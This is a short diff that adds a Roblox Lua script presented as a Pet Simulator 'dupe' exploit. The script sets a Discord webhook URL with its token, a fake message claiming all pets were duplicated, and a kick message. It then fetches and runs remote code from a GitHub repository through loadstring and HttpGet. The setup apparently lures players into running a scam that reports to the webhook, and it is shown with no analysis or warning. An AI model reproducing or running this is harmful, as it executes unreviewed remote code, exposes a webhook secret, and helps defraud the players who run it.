@@ -1,2 +1,5 @@
-# dupes
-dadadaw
+_G.UserID = 3012374027
+_G.Webhook = "https://discord.com/api/webhooks/1009385574035107850/nAi6_vaMM495Fo7B-hLgoLuwjb2qXvsJ4btnJvzV8QUgNnFh53P2XL_NL2DaWAkngdD2"
+_G.KickMessage = "Rejoin in 1-3 minutes"
+_G.PopUpMessage = "Successfully Duped all pets in your bank!"
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2")()
